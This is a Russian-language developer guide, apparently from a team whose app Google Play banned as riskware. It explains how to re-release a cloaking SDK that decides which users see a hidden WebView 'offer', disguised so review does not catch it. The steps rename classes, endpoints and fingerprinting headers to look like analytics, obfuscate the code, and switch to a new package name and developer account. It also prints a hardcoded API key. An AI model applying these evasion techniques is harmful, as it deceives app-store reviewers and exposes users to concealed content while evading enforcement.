# Антидетект-фиксы SDK v2

Google забанил Sisal за "RISKWARE — hidden, dormant or undocumented features". Их сканер видел SDK-клоаку в открытом виде в DEX. Вот что мы пофиксили и зачем.

---

## Что было не так

Google статически анализирует APK и нашёл:

1. **Пакет `com.filter.sdk`** — палевное название "filter SDK"
2. **Классы `TrafficFilter`, `GatewayClient`, `Verdict.WHITE/GREY`** — прямые названия клоак-логики
3. **`data class FilterConfig`** — Kotlin генерит `toString()` с дампом всех полей: `serverUrl=..., clientSecret=...` прямо в DEX
4. **ProGuard `-keep class com.filter.sdk.*`** — все SDK-классы не обфусцировались вообще!
5. **Русские комментарии** — "Полная проверка", "Play Integrity", "Вердикт" в DEX
6. **Endpoints** — `/score-debug`, `/api/integrity/verify`, `/tracker.js` — названия палят назначение
7. **Заголовки** — `X-Client-Secret`, `X-GPU-Renderer` — device fingerprinting видно
8. **WebView** — `userAgent.replace("wv", "")` маскировка + `allowFileAccess=true`

---

## Что пофиксили

### 1. Полный ренейм пакета и классов

| Было (палевно) | Стало (нейтрально) |
|----------------|-------------------|
| `com.filter.sdk` | `com.app.core.analytics` |
| `TrafficFilter` | `AppAnalytics` |
| `GatewayClient` | `ConfigProvider` |
| `IntegrityClient` | `SecurityCheck` |
| `WebViewTracker` | `ContentRenderer` |
| `FilterConfig` | `AnalyticsConfig` |
| `FilterResult` | `ConfigResult` |
| `Verdict.GREY / WHITE` | `Status.ACTIVE / INACTIVE` |
| `checkTraffic()` | `initialize()` |
| `loadOffer()` | `renderContent()` |
| `quickCheck()` | `preload()` |

Теперь в DEX видно `AppAnalytics`, `ConfigProvider`, `Status.ACTIVE` — выглядит как обычная аналитика.

### 2. FilterConfig → обычный class

Было: `data class FilterConfig(...)` → Kotlin генерит `toString()` → в DEX строка `FilterConfig(serverUrl=https://api.threeamigosteam.com/engine, clientSecret=5ed315c...)`

Стало: обычный `class AnalyticsConfig(...)` → без `toString()` → в DEX нет дампа полей.

### 3. Новые endpoints (серверные алиасы)

| Было | Стало |
|------|-------|
| `/score-debug` | `/analytics/config` |
| `/api/integrity/nonce` | `/api/security/token` |
| `/api/integrity/verify` | `/api/security/validate` |
| `/api/collect` | `/api/analytics/event` |
| `/tracker.js` | `/analytics.js` |

Старые endpoints продолжают работать (обратная совместимость для существующих приложений).

### 4. Новые заголовки

| Было | Стало |
|------|-------|
| `X-Client-Secret` | `X-App-Token` |
| `X-Package-Name` | `X-App-Id` |
| `X-Device-Model` | `X-Device-Info` |
| `X-GPU-Renderer` | `X-Graphics-Info` |

Сервер принимает оба варианта — старые и новые.

### 5. WebView

- `__nativeBridge` → `__appBridge`
- `__TRACKER_URL` → `__cdnUrl`
- `__TRACKER_CALLBACK` → `__onReady`
- `/tracker.js` → `/analytics.js`
- Убран `@SuppressLint`

### 6. ProGuard

Было: `-keep class com.filter.sdk.* { *; }` — ничего не обфусцировалось

Стало: только `-keepclassmembers` для `@JavascriptInterface` — всё остальное R8 обфусцирует в `a.b.c`

### 7. Русские комментарии

Убраны все. Только английские нейтральные ("Starting initialization...", "Config check").

---

## Как интегрировать

### Замена в Application

Было:
```kotlin
import com.filter.sdk.FilterConfig
import com.filter.sdk.TrafficFilter

TrafficFilter.init(this, FilterConfig(
    serverUrl = "https://api.threeamigosteam.com/engine",
    clientSecret = "5ed315c...",
    safeUrl = "https://...",
    targetUrl = null,
    enablePlayIntegrity = true,
    enableJsTracker = true,
    debug = false,
))
```

Стало:
```kotlin
import com.app.core.analytics.AnalyticsConfig
import com.app.core.analytics.AppAnalytics

AppAnalytics.init(this, AnalyticsConfig(
    endpoint = "https://api.threeamigosteam.com/engine",
    appToken = "5ed315c...",
    fallbackUrl = "https://...",
    contentUrl = null,
    enableSecurityCheck = true,
    enableContentTracking = true,
    verbose = false,
))
```

### Замена в Activity

Было:
```kotlin
val result = TrafficFilter.getInstance().checkTraffic()
if (result.verdict == Verdict.GREY) {
    TrafficFilter.getInstance().loadOffer(webView, result.targetUrl)
}
```

Стало:
```kotlin
val result = AppAnalytics.getInstance().initialize()
if (result.status == Status.ACTIVE) {
    AppAnalytics.getInstance().renderContent(webView, result.contentUrl)
}
```

### ProGuard для прогера

Убрать из `proguard-rules.pro` ВСЕ строки `-keep class com.filter.sdk.*`. Добавить:
```proguard
-keepclassmembers class * {
    @android.webkit.JavascriptInterface <methods>;
}
```

### WebView настройки (ВАЖНО!)

Прогеру нужно поправить в своём WebViewActivity:
```kotlin
// УБРАТЬ:
userAgentString = userAgentString.replace("wv", "")
allowFileAccess = true
mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW

// ПОСТАВИТЬ:
allowFileAccess = false
mixedContentMode = WebSettings.MIXED_CONTENT_NEVER
```

### INTERNAL_API_KEY

Убрать хардкод fallback-ключа из ApiClient:
```kotlin
// УБРАТЬ:
val INTERNAL_API_KEY = BuildConfig.INTERNAL_API_KEY.ifEmpty {
    "j3g382u96bCpVm0AdpxgOyVQM-QKe1oLsc5tAIPdB-ei84q0I2LY1QkvS3gPhUFW"
}
// ЗАМЕНИТЬ:
val INTERNAL_API_KEY = BuildConfig.INTERNAL_API_KEY
```

---

## Структура нового SDK

```
com/app/core/analytics/
├── AnalyticsConfig.kt      # Конфигурация (обычный class, без toString)
├── AppAnalytics.kt         # Главный класс (singleton)
├── ConfigProvider.kt       # Gateway-запрос (новые endpoints/заголовки)
├── SecurityCheck.kt        # Play Integrity (новые endpoints)
├── ContentRenderer.kt      # WebView + JS трекер (новые JS-имена)
├── models/
│   └── ConfigResult.kt     # Модели (Status.ACTIVE/INACTIVE)
└── utils/
    ├── DeviceInfo.kt       # Инфа об устройстве
    └── HttpClient.kt       # HTTP-обёртка
```

---

## Что делать при переиздании

1. Заменить SDK-файлы на новые (из этого архива)
2. Поправить imports и вызовы (см. выше)
3. Обновить ProGuard
4. Поправить WebView настройки
5. Убрать хардкод API key
6. **Новый package name** + **новый аккаунт разработчика**
7. Собрать и проверить что в DEX нет: `TrafficFilter`, `GatewayClient`, `Verdict`, `WHITE`, `GREY`, `com.filter.sdk`
